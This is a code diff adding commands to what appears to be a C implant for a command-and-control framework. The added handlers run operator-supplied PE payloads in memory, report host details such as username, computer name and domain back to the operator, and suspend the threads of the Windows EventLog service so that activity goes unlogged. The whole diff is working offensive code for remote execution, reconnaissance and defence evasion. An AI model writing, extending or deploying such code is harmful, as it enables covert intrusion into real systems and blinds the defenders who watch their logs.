@@ -3322,6 +3322,87 @@ void dispatch_task(AgentTask *task) {
              strcmp(type_upper, "BOF_STORE_UNLOAD") == 0) {
         agent_send_result(task->id, "", "BOF_STORE: not yet implemented in C agent");
     }
+    /* ── Parity aliases & stubs ──────────────────────────────────────────── */
+    else if (strcmp(type_upper, "PE_EXEC") == 0) {
+        /* alias for EXEC_PE */
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "PE_EXEC: no PE payload"); return;
+        }
+        char *pe_out = exec_pe(task->payload, task->payload_len);
+        agent_send_result(task->id, pe_out ? pe_out : "", ""); free(pe_out);
+    }
+    else if (strcmp(type_upper, "DETECTED") == 0) {
+        agent_send_result(task->id, "[!] DETECTED flag acknowledged", "");
+    }
+    else if (strcmp(type_upper, "HOME") == 0 || strcmp(type_upper, "USERPROFILE") == 0) {
+        const char *v = getenv("USERPROFILE"); if (!v) v = "";
+        agent_send_result(task->id, v, "");
+    }
+    else if (strcmp(type_upper, "USERDOMAIN") == 0) {
+        const char *v = getenv("USERDOMAIN"); if (!v) v = "";
+        agent_send_result(task->id, v, "");
+    }
+    else if (strcmp(type_upper, "USERNAME") == 0 || strcmp(type_upper, "USER") == 0) {
+        const char *v = getenv("USERNAME"); if (!v) v = "";
+        agent_send_result(task->id, v, "");
+    }
+    else if (strcmp(type_upper, "COMPUTERNAME") == 0) {
+        const char *v = getenv("COMPUTERNAME"); if (!v) v = "";
+        agent_send_result(task->id, v, "");
+    }
+    else if (strcmp(type_upper, "TEMP") == 0) {
+        const char *v = getenv("TEMP"); if (!v) v = getenv("TMP"); if (!v) v = "";
+        agent_send_result(task->id, v, "");
+    }
+    else if (strcmp(type_upper, "DISPLAY") == 0) {
+        const char *v = getenv("DISPLAY"); if (!v) v = "";
+        agent_send_result(task->id, v, "");
+    }
+    else if (strcmp(type_upper, "EVENTLOG_SUSPEND") == 0 ||
+             strcmp(type_upper, "EVENTLOG_RESUME") == 0) {
+        int do_suspend = (strcmp(type_upper, "EVENTLOG_SUSPEND") == 0);
+        /* find svchost.exe hosting EventLog via SC, then suspend/resume its threads */
+        DWORD svc_pid = 0;
+        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+        if (scm) {
+            SC_HANDLE svc = OpenServiceA(scm, "EventLog", SERVICE_QUERY_STATUS);
+            if (svc) {
+                SERVICE_STATUS_PROCESS ssp = {0};
+                DWORD nb = 0;
+                if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
+                        (LPBYTE)&ssp, sizeof(ssp), &nb))
+                    svc_pid = ssp.dwProcessId;
+                CloseServiceHandle(svc);
+            }
+            CloseServiceHandle(scm);
+        }
+        if (!svc_pid) {
+            agent_send_result(task->id, "", "EVENTLOG: failed to locate EventLog PID"); return;
+        }
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (snap == INVALID_HANDLE_VALUE) {
+            agent_send_result(task->id, "", "EVENTLOG: CreateToolhelp32Snapshot failed"); return;
+        }
+        int count = 0;
+        THREADENTRY32 te = { sizeof(te) };
+        if (Thread32First(snap, &te)) {
+            do {
+                if (te.th32OwnerProcessID == svc_pid) {
+                    HANDLE th = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                    if (th) {
+                        if (do_suspend) SuspendThread(th);
+                        else ResumeThread(th);
+                        CloseHandle(th); count++;
+                    }
+                }
+            } while (Thread32Next(snap, &te));
+        }
+        CloseHandle(snap);
+        char msg[128];
+        snprintf(msg, sizeof(msg), "[+] EventLog %s: %d thread(s) affected",
+                 do_suspend ? "suspended" : "resumed", count);
+        agent_send_result(task->id, msg, "");
+    }
 #endif /* _WIN32 */
     else {
         char err[128];
